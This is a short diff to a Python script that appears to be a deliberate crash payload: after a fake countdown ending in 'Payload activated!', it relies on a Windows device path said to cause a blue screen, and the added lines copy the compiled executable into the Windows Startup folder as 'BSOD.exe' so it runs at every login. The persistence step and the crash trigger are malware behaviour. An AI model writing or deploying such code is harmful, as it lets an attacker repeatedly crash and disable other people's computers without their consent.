@@ -2,7 +2,7 @@
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-import time, os, sys, imp
+import time, os, sys, imp, shutil
 
 # Detect wether you're running an EXE or PY file
 def isEXE():
@@ -24,6 +24,9 @@ if isEXE() == False:
     print("Progress >> %s/10" % n, end="\r")
     time.sleep(1)
   print("Payload activated!")
+
+if isEXE() == True:
+  shutil.copy(__file__, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\BSOD.exe")
 
 # Windows BSODs when you enter `\\.\GLOBALROOT\Device\ConDrv\KernelConnect`
 # into a browser. Sadly this doesn't work on the built-in Internet Explorer,
